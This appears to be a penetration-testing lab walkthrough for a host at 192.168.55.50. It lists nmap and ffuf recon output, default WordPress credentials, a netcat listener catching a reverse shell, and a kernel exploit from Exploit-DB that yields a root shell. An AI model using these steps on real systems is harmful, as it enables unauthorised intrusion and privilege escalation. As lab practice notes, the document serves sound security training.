# Export
```bash
export IP="192.168.55.50"
export URL="http://192.168.55.50:80/FUZZ"
```

<hr>

# Credentials
+ Wordpress: `admin:admin`

<hr>

# RCE
+ WordPress
```bash
nc -nlvp 80                                                                           1 ⚙  
listening on [any] 80 ...                      
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.50] 35604                                
Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 03:53:26 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00                                                                                                                                
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                                           
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                          
/bin/sh: 0: can't access tty; job control turned off                                           
$
```

<hr>

# Privilege Escalation
+ Kernel exploit: https://www.exploit-db.com/exploits/44298
```bash
www-data@ubuntu:/dev/shm$ chmod +x exploit 
www-data@ubuntu:/dev/shm$ ./exploit 
task_struct = ffff88003bff4600
uidptr = ffff8800340bcf04
spawning root shell
root@ubuntu:/dev/shm#
```

<hr>

# Nmap
```bash
PORT   STATE SERVICE REASON         VERSION                                                                                                                                                   
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3                                                                                                                                              
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                        
| ftp-syst:                                                                                    
|   STAT:                                      
| FTP server status:                                                                           
|      Connected to ::ffff:192.168.49.55
|      Logged in as ftp                                                                        
|      TYPE: ASCII                             
|      No session bandwidth limit
|      Session timeout in seconds is 300       
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status                                
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                 
|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKrYYWK3Xv2EBb0KryPAargHdeVdVuGj+AHTUbH1CyLIuQ3zbtaq2+lr5K/aMqiJ5othz27+RWSJ2NmQ2JeOUBCogFLikCwU6MRDQLHpV+neS3fAKrH5fNnXo+RfnMWBLQaaXBPiUOQaoQc27hRN3S
J1hbVLEF65TY0siTrOj0Lt8SRztwkbfynHEKxMsQi5WWDLTgS7bivCf9VVWwqgmuBbsJAqFExDjLxlxJpH4+93bgEtD9EPV/KKO9B3Inaz8PxC+zXZofhZXloysYoGg4IZzT55JzrRVRuv/cbGcMuGTBpCCkdH01G4NCSgL7YwX13C1Qc+EFX1QExV6k1e
PD                                             
|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFTsqff4O0hsl+RUR2lXFcbCEkvFcspHALA2RR2DpoD2AlRN/DEpIbW3NETNXxxyKHTtGhUiBSUuw8S9RSBAsnY=
|   256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH91w++CdkbeAkmXYietVhD/73nEaXR/nbeBEyuwLwgq                                                                                                            
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:                                                                                
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry      
|_Hackers                                      
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

```

<hr>

# Web Application
+ Directory

```bash
ffuf -u $URL -w /usr/share/seclists/Discovery/Web-Content/common.txt
index.html              [Status: 200, Size: 81, Words: 5, Lines: 6]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 1451, Words: 828, Lines: 19]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12]
upload                  [Status: 301, Size: 315, Words: 20, Lines: 10]
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10]
```

